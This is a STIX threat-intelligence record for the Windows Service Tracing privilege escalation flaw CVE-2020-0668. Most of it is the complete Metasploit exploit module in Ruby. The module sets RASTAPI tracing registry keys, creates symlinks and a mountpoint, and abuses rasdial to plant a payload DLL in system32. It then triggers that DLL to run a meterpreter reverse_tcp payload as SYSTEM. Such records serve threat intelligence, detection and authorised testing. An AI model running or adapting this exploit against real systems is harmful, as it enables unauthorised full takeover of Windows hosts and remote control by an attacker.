{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1bdbaca4-9bf5-4621-885b-73643854bdde",
    "created": "2024-08-14T16:48:56.759467Z",
    "modified": "2024-08-14T16:48:56.759472Z",
    "name": "Service Tracing Privilege Elevation Vulnerability",
    "description": " This module leverages a trusted file overwrite with a DLL hijacking vulnerability to gain SYSTEM-level access on vulnerable Windows 10 x64 targets.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_0668_service_tracing.rb",
            "external_id": "cve_2020_0668_service_tracing.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0668"
        },
        {
            "source_name": "reference",
            "url": "https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/itm4n/SysTracingPoc"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/RedCursorSecurityConsulting/CVE-2020-0668"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/ea5921d4-6046-4a3b-963f-08e8bde1762a"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Service Tracing Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This module leverages a trusted file overwrite with a DLL hijacking\n          vulnerability to gain SYSTEM-level access on vulnerable Windows 10 x64\n          targets.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'itm4n', # PoC\n          'bwatters-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-02-11',\n        'References' => [\n          ['CVE', '2020-0668'],\n          ['URL', 'https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/'],\n          ['URL', 'https://github.com/itm4n/SysTracingPoc'],\n          ['URL', 'https://github.com/RedCursorSecurityConsulting/CVE-2020-0668'],\n          ['PACKETSTORM', '156576'],\n          ['URL', 'https://attackerkb.com/assessments/ea5921d4-6046-4a3b-963f-08e8bde1762a'],\n          ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html']\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => false,\n          'EXITFUNC' => 'thread',\n          'Payload' => 'windows/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 900\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_fs_md5\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EXPLOIT_DIR',\n                    [false, 'The directory to create for mounting (%TEMP%\\\\%RAND% by default).', nil]),\n      OptBool.new('OVERWRITE_DLL',\n                  [true, 'Overwrite WindowsCreDeviceInfo.dll if it exists (false by default).', false]),\n      OptString.new('PAYLOAD_UPLOAD_NAME',\n                    [false, 'The filename to use for the payload binary (%RAND% by default).', nil]),\n      OptString.new('PHONEBOOK_UPLOAD_NAME',\n                    [false, 'The name of the phonebook file to trigger RASDIAL (%RAND% by default).', nil])\n    ])\n  end\n\n  def write_reg_value(registry_hash)\n    vprint_status(\"Writing #{registry_hash[:value_name]} to #{registry_hash[:key_name]}\")\n    begin\n      if !registry_key_exist?(registry_hash[:key_name])\n        registry_createkey(registry_hash[:key_name])\n        registry_hash[:delete_on_cleanup] = true\n      else\n        registry_hash[:delete_on_cleanup] = false\n      end\n      registry_setvaldata(registry_hash[:key_name].strip, \\\n                          registry_hash[:value_name].strip, \\\n                          registry_hash[:value_value], \\\n                          registry_hash[:value_type])\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(e.to_s)\n    end\n  end\n\n  def remove_reg_value(registry_hash)\n    # we may have already deleted the key\n    return unless registry_key_exist?(registry_hash[:key_name])\n\n    begin\n      if registry_hash[:delete_on_cleanup]\n        vprint_status(\"Deleting #{registry_hash[:key_name]} key\")\n        registry_deletekey(registry_hash[:key_name])\n      else\n        vprint_status(\"Deleting #{registry_hash[:value_name]} from #{registry_hash[:key_name]} key\")\n        registry_deleteval(registry_hash[:key_name], registry_hash[:value_name])\n      end\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_bad('Unable to clean up registry')\n      print_error(e.to_s)\n    end\n  end\n\n  def create_reg_hash(new_size, exploit_dir)\n    reg_keys = []\n    reg_keys.push(key_name: 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\RASTAPI',\n                  value_name: 'EnableFileTracing',\n                  value_type: 'REG_DWORD',\n                  value_value: 1,\n                  delete_on_cleanup: false)\n    reg_keys.push(key_name: 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\RASTAPI',\n                  value_name: 'FileDirectory',\n                  value_type: 'REG_EXPAND_SZ',\n                  value_value: exploit_dir,\n                  delete_on_cleanup: false)\n    reg_keys.push(key_name: 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\RASTAPI',\n                  value_name: 'MaxFileSize',\n                  value_type: 'REG_DWORD',\n                  value_value: new_size,\n                  delete_on_cleanup: false)\n    reg_keys\n  end\n\n  def remove_file(file_pathname)\n    vprint_status(\"Deleting #{file_pathname}\")\n    begin\n      session.fs.file.rm(file_pathname)\n    rescue Rex::Post::Meterpreter::RequestError\n      print_error(\"Manual cleanup of \\\"#{file_pathname}\\\" required!\")\n    end\n  end\n\n  def launch_dll_trigger\n    print_status('Triggering the Reflective DLL injection and running the LPE DLL...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x64.dll'),\n      encoded_payload\n    )\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    print_error(e.message)\n  end\n\n  def rastapi_privileged_filecopy(file_contents, exploit_dir, upload_payload_pathname, target_payload_pathname)\n    handles = [] # stores open handles to cleanup properly\n    reg_hash = create_reg_hash(file_contents.length - 1, exploit_dir)\n    vprint_status(\"Registry hash = #{reg_hash}\")\n\n    # set up directories and mountpoints\n    vprint_status(\"Making #{exploit_dir} on #{sysinfo['Computer']}\")\n    mkdir(exploit_dir)\n    vprint_status(\"Made #{exploit_dir}\")\n    register_file_for_cleanup(upload_payload_pathname)\n    mount_dir = '\\\\RPC Control\\\\'\n\n    # Create mountpoint\n    print_status('Creating mountpoint')\n    mount_point_handle = create_mount_point(exploit_dir, mount_dir)\n    unless mount_point_handle\n      fail_with(Failure::Unknown, 'Error when creating the mount point... aborting.')\n    end\n\n    # Upload payload\n    print_status(\"Uploading payload to #{upload_payload_pathname}\")\n    write_file(upload_payload_pathname, file_contents)\n    register_file_for_cleanup(upload_payload_pathname)\n    upload_md5 = session.fs.file.md5(upload_payload_pathname)\n    vprint_status(\"Payload md5 = #{Rex::Text.to_hex(upload_md5, '')}\")\n\n    # Create Symlinks\n    print_status('Creating Symlinks')\n    vprint_status(\"Creating symlink #{upload_payload_pathname} in \\\\RPC Control\\\\RASTAPI.LOG\")\n    symlink_handle = create_object_symlink(nil, '\\\\RPC Control\\\\RASTAPI.LOG', \"\\\\??\\\\#{upload_payload_pathname}\")\n    unless symlink_handle\n      fail_with(Failure::Unknown, 'Error when creating the RASTAPI.LOG symlink... aborting.')\n    end\n    vprint_status(\"Collected Symlink Handle #{symlink_handle}\")\n    handles.push(symlink_handle)\n    vprint_status(\"Creating symlink #{target_payload_pathname} in \\\\RPC Control\\\\RASTAPI.OLD\")\n    symlink_handle = create_object_symlink(nil, '\\\\RPC Control\\\\RASTAPI.OLD', \"\\\\??\\\\#{target_payload_pathname}\")\n    unless symlink_handle\n      fail_with(Failure::Unknown, 'Error when creating the RASTAPI.OLD symlink... aborting.')\n    end\n    vprint_status(\"Collected Symlink Handle #{symlink_handle}\")\n    handles.push(symlink_handle)\n\n    # write registry keys\n    reg_hash.each do |entry|\n      write_reg_value(entry)\n    end\n\n    # Upload phonebook file\n    phonebook_name = datastore['PHONEBOOK_NAME'] || \"#{Rex::Text.rand_text_alpha(6..13)}.pbk\"\n    upload_phonebook_pathname = \"#{session.sys.config.getenv('TEMP')}\\\\#{phonebook_name}\"\n    launch_rasdialer(upload_phonebook_pathname)\n    register_file_for_cleanup(upload_phonebook_pathname)\n    vprint_status(\"Checking on #{target_payload_pathname}\")\n    vprint_status(\"Upload payload md5 = #{Rex::Text.to_hex(upload_md5, '')}\")\n    moved_md5 = session.fs.file.md5(target_payload_pathname)\n    vprint_status(\"Moved payload md5 = #{Rex::Text.to_hex(moved_md5, '')}\")\n\n    # clean up after file move\n    print_status('Cleaning up before triggering dll load...')\n    print_status('Removing Registry keys')\n    reg_hash.each do |entry|\n      remove_reg_value(entry)\n    end\n    print_status('Removing Symlinks')\n    handles.each do |handle|\n      result = session.railgun.kernel32.CloseHandle(handle)\n      vprint_status(\"Closing symlink handle #{handle}: #{result['ErrorMessage']}\")\n    end\n    print_status('Removing Mountpoint')\n    delete_mount_point(exploit_dir, mount_point_handle)\n    print_status('Removing directories')\n    unless moved_md5 == upload_md5\n      fail_with(Failure::Unknown, 'Payload hashes do not match; filecopy failed.')\n    end\n  end\n\n  def exploit\n    validate_target\n    validate_active_host\n    # dll should not already exist\n    win_dir = session.sys.config.getenv('windir')\n    target_payload_pathname = \"#{win_dir}\\\\system32\\\\WindowsCoreDeviceInfo.dll\"\n    if file?(target_payload_pathname)\n      print_warning(\"#{target_payload_pathname} already exists\")\n      print_warning('If it is in use, the overwrite will fail')\n      unless datastore['OVERWRITE_DLL']\n        print_error('Change OVERWRITE_DLL option to true if you would like to proceed.')\n        fail_with(Failure::BadConfig, \"#{target_payload_pathname} already exists and OVERWRITE_DLL option is false\")\n      end\n    end\n\n    # set up variables\n    temp_dir = session.sys.config.getenv('TEMP')\n    exploit_dir = datastore['EXPLOIT_DIR'] || \"#{temp_dir}\\\\#{Rex::Text.rand_text_alpha(6..13)}\"\n    upload_payload_pathname = \"#{session.sys.config.getenv('TEMP')}\\\\#{Rex::Text.rand_text_alpha(6..13)}.dll\"\n    payload_dll = generate_payload_dll\n    print_status(\"Payload DLL is #{payload_dll.length} bytes long\")\n\n    # start file copy\n    rastapi_privileged_filecopy(payload_dll, exploit_dir, upload_payload_pathname, target_payload_pathname)\n\n    # launch trigger\n    launch_dll_trigger\n    print_warning(\"Manual cleanup after reboot required for #{target_payload_pathname} and #{exploit_dir}\")\n    print_status('Exploit complete.  It may take up to 10 minutes to get a session')\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_target\n    unless sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')\n    end\n\n    if session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    end\n\n    version_info = get_version_info\n    vprint_status(\"Version: #{version_info.number}\")\n    unless version_info.build_version.between?(Msf::WindowsVersion::Win10_1803, Msf::WindowsVersion::Win10_1909)\n      fail_with(Failure::NotVulnerable, 'The exploit only supports Windows 10 build versions 17134-18363')\n    end\n  end\n\n  def launch_rasdialer(upload_phonebook_pathname)\n    local_phonebook_path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2020-0668', 'phonebook.txt')\n    ensure_clean_destination(upload_phonebook_pathname)\n    vprint_status(\"Uploading phonebook to #{sysinfo['Computer']} as #{upload_phonebook_pathname} from #{local_phonebook_path}\")\n    begin\n      upload_file(upload_phonebook_pathname, local_phonebook_path)\n    rescue Rex::Post::Meterpreter::RequestError\n      print_error('Failed to upload phonebook')\n      return nil\n    end\n    print_status(\"Phonebook uploaded on #{sysinfo['Computer']} to #{upload_phonebook_pathname}\")\n\n    # Launch RASDIAL\n    vprint_status('Launching Rasdialer')\n    rasdial_cmd = \"rasdial VPNTEST test test /PHONEBOOK:#{upload_phonebook_pathname}\"\n    print_status(\"Running Rasdialer with phonebook #{upload_phonebook_pathname}\")\n    output = cmd_exec('cmd.exe', \"/c #{rasdial_cmd}\", 60)\n    vprint_status(output)\n  end\n\n  def ensure_clean_destination(path)\n    return unless file?(path)\n\n    print_status(\"#{path} already exists on the target. Deleting...\")\n    begin\n      file_rm(path)\n      print_status(\"Deleted #{path}\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      elog(e)\n      print_error(\"Unable to delete #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-11",
    "x_mitre_platforms": [
        "['win']"
    ]
}